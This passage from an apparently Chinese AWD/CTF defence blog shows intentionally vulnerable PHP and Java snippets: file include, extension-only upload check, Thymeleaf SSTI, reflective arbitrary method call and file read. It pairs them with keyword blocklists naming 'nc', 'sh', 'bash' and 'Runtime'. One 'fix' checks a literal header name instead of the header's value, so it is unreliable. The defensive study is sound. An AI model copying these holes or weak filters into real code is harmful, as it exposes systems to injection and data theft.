punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">include</span> <span class="token variable">$action</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"File not found!"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$allowed_extensions</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"gif"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 允许上传的文件后缀名</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取文件后缀名并转换为小写</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span> <span class="token variable">$allowed_extensions</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 检查文件后缀名是否在允许上传的列表中</span>     <span class="token keyword">echo</span> <span class="token string double-quoted-string">"不允许上传该类型的文件！"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$target_file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads/"</span> <span class="token operator">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 为上传文件指定目标路径</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 将文件从临时目录移动到目标路径</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件上传成功！"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">filter_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">]</span>strings <span class="token operator">=</span> <span class="token string">"ana"</span>  <span class="token comment"># 匹配包含"ana"的字符串</span><span class="token keyword">for</span> i <span class="token keyword">in</span> filter_list<span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token keyword">in</span> strings<span class="token punctuation">:</span><span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"Hacker!"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token parameter">query</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>query<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">||</span> query<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"nc"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"禁止使用 flag 和 nc 关键字！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 执行正常操作</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p>检测解码后的payload是否含有恶意类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> sea <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>decodemsg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>sea<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"com.sea."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">"filtered"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="thymeleaf-ssti"><a href="#thymeleaf-ssti" class="headerlink" title="thymeleaf ssti"></a>thymeleaf ssti</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AboutController</span> <span class="token punctuation">&#123;</span>  <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/about"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">about</span><span class="token punctuation">(</span><span class="token class-name">HttpSession</span> session<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>defaultValue <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token class-name">String</span> type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> username <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token string">"about/tourist/about"</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>type<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token string">"about/"</span> <span class="token operator">+</span> type <span class="token operator">+</span> <span class="token string">"/about"</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token string">"about/user/about"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fix版本：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AboutController</span> <span class="token punctuation">&#123;</span>  <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/about"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">about</span><span class="token punctuation">(</span><span class="token class-name">HttpSession</span> session<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>defaultValue <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token class-name">String</span> type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> username <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token string">"about/tourist/about"</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>type<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"about/system/about"</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"tourist"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"about/tourist/about"</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"about/user/about"</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">return</span> <span class="token string">"about/user/about"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="任意方法调用"><a href="#任意方法调用" class="headerlink" title="任意方法调用"></a>任意方法调用</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LogOutController</span> <span class="token punctuation">&#123;</span>  <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/logout"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpSession</span> session<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>defaultValue <span class="token operator">=</span> <span class="token string">"logout"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> method<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>defaultValue <span class="token operator">=</span> <span class="token string">"com.mengda.awd.Utils.SessionUtils"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> targetclass<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token class-name">ObjectClass</span> <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>targetclass<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> constructor <span class="token operator">=</span> <span class="token class-name">ObjectClass</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Object</span> <span class="token class-name">CLassInstance</span> <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"logout"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Method</span> targetMethod <span class="token operator">=</span> <span class="token class-name">ObjectClass</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">HttpSession</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        targetMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">CLassInstance</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> session <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Method</span> targetMethod <span class="token operator">=</span> <span class="token class-name">ObjectClass</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        targetMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">CLassInstance</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token string">"redirect:/"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">return</span> <span class="token string">"redirect:/"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fix：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LogOutController</span> <span class="token punctuation">&#123;</span>  <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/logout"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpSession</span> session<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>defaultValue <span class="token operator">=</span> <span class="token string">"logout"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> method<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>defaultValue <span class="token operator">=</span> <span class="token string">"com.mengda.awd.Utils.SessionUtils"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> targetclass<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> blackList <span class="token operator">=</span> <span class="token punctuation">&#123;</span>         <span class="token string">"cat"</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token string">"tac"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"bash"</span><span class="token punctuation">,</span> <span class="token string">"Runtime"</span><span class="token punctuation">,</span> <span class="token string">"ProcessBuilder"</span><span class="token punctuation">,</span>         <span class="token string">"ProcessImpl"</span><span class="token punctuation">,</span> <span class="token string">"UNIXProcess"</span><span class="token punctuation">,</span> <span class="token string">"File"</span><span class="token punctuation">,</span> <span class="token string">"Read"</span><span class="token punctuation">,</span> <span class="token string">"run"</span><span class="token punctuation">,</span> <span class="token string">"build"</span><span class="token punctuation">,</span> <span class="token string">"start"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> s <span class="token operator">:</span> blackList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> s <span class="token operator">:</span> blackList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>targetclass<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> s <span class="token operator">:</span> blackList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token class-name">ObjectClass</span> <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>targetclass<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> constructor <span class="token operator">=</span> <span class="token class-name">ObjectClass</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Object</span> <span class="token class-name">CLassInstance</span> <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"logout"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Method</span> targetMethod <span class="token operator">=</span> <span class="token class-name">ObjectClass</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">HttpSession</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        targetMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">CLassInstance</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> session <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Method</span> targetMethod2 <span class="token operator">=</span> <span class="token class-name">ObjectClass</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        targetMethod2<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">CLassInstance</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       <span class="token keyword">return</span> <span class="token string">"redirect:/"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token string">"redirect:/"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@WebFilter</span><span class="token punctuation">(</span>urlPatterns <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> myFilter <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">HttpServletRequest</span> request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span>servletRequest<span class="token punctuation">;</span>    <span class="token class-name">String</span> request_uri <span class="token operator">=</span> <span class="token class-name">URLDecoder</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Check</span><span class="token punctuation">.</span><span class="token function">check</span><span class="token punctuation">(</span>request_uri<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">booleanValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">String</span> static_resources_path <span class="token operator">=</span> <span class="token string">"/usr/local/tomcat/webapps/app/WEB-INF/classes/static/"</span> <span class="token operator">+</span> request_uri<span class="token punctuation">;</span>      static_resources_path <span class="token operator">=</span> <span class="token class-name">URLDecoder</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>static_resources_path<span class="token punctuation">,</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        servletResponse<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>static_resources_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        servletResponse<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"error~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token 